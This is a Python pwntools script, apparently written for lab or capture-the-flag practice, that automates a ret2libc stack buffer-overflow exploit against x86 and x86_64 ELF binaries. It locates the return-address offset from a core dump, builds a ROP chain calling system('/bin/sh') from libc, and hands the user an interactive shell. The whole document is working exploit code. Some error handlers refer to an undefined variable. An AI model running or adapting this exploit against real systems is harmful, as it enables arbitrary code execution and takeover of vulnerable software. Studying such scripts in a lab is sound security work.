#!/usr/bin/env python3

# ret2libc.py - a pwntools script that can automate a simple ret2libc attack on x86 and x86_64 ELF binaries
# Created by dilldylanpickle on 5-8-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10 (https://www.python.org/downloads/release/python-3810/)
#   - Pwntools (https://github.com/Gallopsled/pwntools)
#   - ROPgadget (https://github.com/JonathanSalwan/ROPgadget)

import os           # Provides a way of using operating system dependent functionalities
import re           # Allows pattern matching and text processing through regex
import subprocess   # Allows running of external commands and communication with shell or child processes
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)

    # Set log level to debug if debugging is needed
    context.log_level = 'debug'

    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Get the offset by calling the find_offset() function
        offset = find_offset(elf)

        # Construct the payload
        payload = b'\x69' * offset
        payload += ret2libc(elf)

        # Print the payload in hexadecimal representation for debugging purposes
        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
        
        # Send the payload and print the output
        io.sendline(payload)
        log.info(io.clean().decode())

        # Allow the user to interact with the shell
        io.interactive()

def ret2libc(elf):

    # Run the `ldd` command to get the dynamic dependencies of the binary and search for the libc library in the dependencies
    try:
        ldd_output = subprocess.check_output(["ldd", elf.path]).decode()
    except Exception as e:
        raise Exception(f"Error executing ldd command: {e}")

    # Search for the libc library in the dependencies and extract its base address
    if match := re.search(r'libc\.so\.6 => .+ \((0x[0-9a-f]+)\)', ldd_output):

        # Collect the base address of the C standard library
        libc_base_addr = int(match.group(1), 16)
        log.debug(f"The base address of libc is {hex(libc_base_addr)}")
    else:
        raise Exception(f"Error: libc not found in {elf.path}")

    # Check if the architecture is supported
    if elf.arch not in ['i386', 'amd64']:
        raise ValueError(f"Unsupported architecture: {elf.arch}")

    # If the architecture is x86, perform a simple x86 based ret2libc attack
    if elf.arch == 'i386':

        # Construct a payload with required components
        payload = p32(elf.libc.symbols["system"] + libc_base_addr)
        payload += p32(0x0)
        payload += p32(next(elf.libc.search(b'/bin/sh\x00')) + libc_base_addr)

    # If the architecture is x86, perform a simple x86_64 based ret2libc attack
    elif elf.arch == 'amd64':
        
        # Construct a payload with required components
        payload = p64(ROP(elf).find_gadget(['pop rdi', 'ret']).address)
        payload += p64(next(elf.libc.search(b'/bin/sh\x00')) + libc_base_addr)
        payload += p64(ROP(elf).find_gadget(['ret'])[0])
        payload += p64(elf.libc.symbols["system"] + libc_base_addr)
        payload += p64(0x0)

    return payload

def find_cyclic_pattern(io):

    # Generate and send a cyclic pattern as input to the binary
    pattern = cyclic(420)
    io.sendline(pattern)
    io.wait()

    # Return the core file
    return io.corefile

def find_offset(elf):

    # Save the original log level which would be either 'info' or 'debug'
    log_level = context.log_level

    # Disable logging for offset calculations
    context.log_level = 'error'

     # Record a memory crash in the Core_Dumps subdirectory
    try:

        # Create a directory called 'Core_Dumps' if it does not already exist
        if not os.path.exists('Core_Dumps'):
            os.makedirs('Core_Dumps')

        # Automatically close the process when the "with" block is exited
        with process(elf.path) as io:

            # If the architecture is x86, calculate the offset to overwrite eip
            if context.arch == 'i386':
                core = find_cyclic_pattern(io)
                offset = cyclic_find(p32(core.eip), n=4)

            # If the architecture is x86_64, calculate the offset to overwrite rip
            elif context.arch == 'amd64':
                core = find_cyclic_pattern(io)
                rip = core.rip
                offset = cyclic_find(core.read(core.rsp, 4))

            # Revert the log level to the original value
            context.log_level = log_level

        # Move all files with the pattern 'core.*' to the 'core' directory
        for filename in os.listdir('.'):
            if filename.startswith('core.'):
                os.rename(filename, os.path.join('Core_Dumps', filename))

        # Output the calculated offset for debugging purposes
        log.debug(f"The offset calculated to overwrite the instruction pointer is {offset} bytes")

        # Return the calculated offset to overwrite the instruction pointer
        return offset

    except FileNotFoundError as e:
        log.error(f"Error: Binary file not found at {binary_path}")
        raise e
    except PermissionError as e:
        log.error(f"Error: You do not have permission to access {binary_path}")
        raise e
    except ValueError as e:
        log.error(f"Error: Unable to find cyclic pattern in core dump")
        raise e
    except Exception as e:
        log.error(f"Error: An unexpected error occurred while finding the offset")
        raise e

if __name__ == '__main__':

    # Initiate the executables name to declare a valid filesystem path
    binary_path = './vulnerable64'
    warnings.filterwarnings("ignore", category=BytesWarning)

    # Perform the exploitation on the specified binary
    exploit(binary_path)